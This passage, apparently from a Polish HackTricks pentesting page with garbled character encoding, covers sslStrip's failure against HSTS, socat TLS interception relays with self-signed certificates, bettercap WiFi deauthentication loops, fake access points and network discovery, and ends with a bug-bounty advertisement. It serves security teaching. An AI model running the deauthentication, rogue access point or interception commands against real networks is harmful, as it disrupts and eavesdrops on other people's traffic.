WiÄ™cej informacji [tutaj](https://www.bettercap.org/legacy/#hsts-bypass), [tutaj](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [tutaj](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip lub sslStrip+ nie dziaÅ‚ajÄ… juÅ¼. Dzieje siÄ™ tak, poniewaÅ¼ w przeglÄ…darkach sÄ… zapisane zasady HSTS, wiÄ™c nawet jeÅ›li to pierwszy raz, gdy uÅ¼ytkownik uzyskuje dostÄ™p do "waÅ¼nej" domeny, uzyska do niej dostÄ™p przez HTTPS. ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e zapisane zasady i inne generowane zasady mogÄ… uÅ¼ywaÄ‡ flagi** [**`includeSubdomains`**](https://hstspreload.appspot.com) **wiÄ™c przykÅ‚ad** _**wwww.facebook.com**_ **z poprzedniego nie zadziaÅ‚a, poniewaÅ¼** _**facebook.com**_ **uÅ¼ywa HSTS z `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## NasÅ‚uchiwanie TCP na porcie
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL nasÅ‚uch na porcie

#### Wygeneruj klucze i certyfikat samopodpisany
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### SÅ‚uchaj za pomocÄ… certyfikatu
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### SÅ‚uchaj uÅ¼ywajÄ…c certyfikatu i przekieruj do hostÃ³w
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Czasami, jeÅ›li klient sprawdzi, Å¼e CA jest waÅ¼ne, moÅ¼esz **serwowaÄ‡ certyfikat innej nazwy hosta podpisany przez CA**.\
Innym interesujÄ…cym testem jest **serwowanie certyfikatu Å¼Ä…danej nazwy hosta, ale samopodpisanego**.

Inne rzeczy do przetestowania to prÃ³ba podpisania certyfikatu waÅ¼nym certyfikatem, ktÃ³ry nie jest waÅ¼nym CA. Lub uÅ¼ycie waÅ¼nego klucza publicznego, wymuszenie uÅ¼ycia algorytmu takiego jak Diffie-Hellman (takiego, ktÃ³ry nie wymaga odszyfrowania czegokolwiek za pomocÄ… prawdziwego klucza prywatnego) i gdy klient poprosi o prÃ³bkÄ™ prawdziwego klucza prywatnego (jak hasz), wysÅ‚anie faÅ‚szywej prÃ³bki i oczekiwanie, Å¼e klient tego nie sprawdzi.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notatki dotyczÄ…ce aktywnego odkrywania

WeÅº pod uwagÄ™, Å¼e gdy pakiet UDP jest wysyÅ‚any do urzÄ…dzenia, ktÃ³re nie ma Å¼Ä…danego portu, wysyÅ‚any jest ICMP (Port Unreachable).

### **ARP discover**

Pakiety ARP sÄ… uÅ¼ywane do odkrywania, ktÃ³re adresy IP sÄ… uÅ¼ywane w sieci. Komputer musi wysÅ‚aÄ‡ zapytanie dla kaÅ¼dego moÅ¼liwego adresu IP, a tylko te, ktÃ³re sÄ… uÅ¼ywane, odpowiedzÄ….

### **mDNS (multicast DNS)**

Bettercap wysyÅ‚a zapytanie MDNS (co X ms) pytajÄ…c o **\_services\_.dns-sd.\_udp.local**, maszyna, ktÃ³ra widzi ten pakiet, zazwyczaj odpowiada na to zapytanie. NastÄ™pnie, wyszukuje tylko maszyny odpowiadajÄ…ce na "services".

**NarzÄ™dzia**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap rozsyÅ‚a pakiety do portu 137/UDP pytajÄ…c o nazwÄ™ "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap rozsyÅ‚a pakiety SSDP w poszukiwaniu wszelkiego rodzaju usÅ‚ug (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap rozsyÅ‚a pakiety WSD w poszukiwaniu usÅ‚ug (UDP Port 3702).

## Referencje

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Ocena bezpieczeÅ„stwa sieci: Poznaj swojÄ… sieÄ‡ (3. wydanie)**
* **Praktyczne Hacking IoT: Ostateczny przewodnik po atakowaniu Internetu Rzeczy. Autorzy: Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**WskazÃ³wka dotyczÄ…ca bug bounty**: **zarejestruj siÄ™** w **Intigriti**, premium **platformie bug bounty stworzonej przez hackerÃ³w, dla hackerÃ³w**! DoÅ‚Ä…cz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) juÅ¼ dziÅ› i zacznij zarabiaÄ‡ nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na GitHubie.

</details>
{% endhint %}
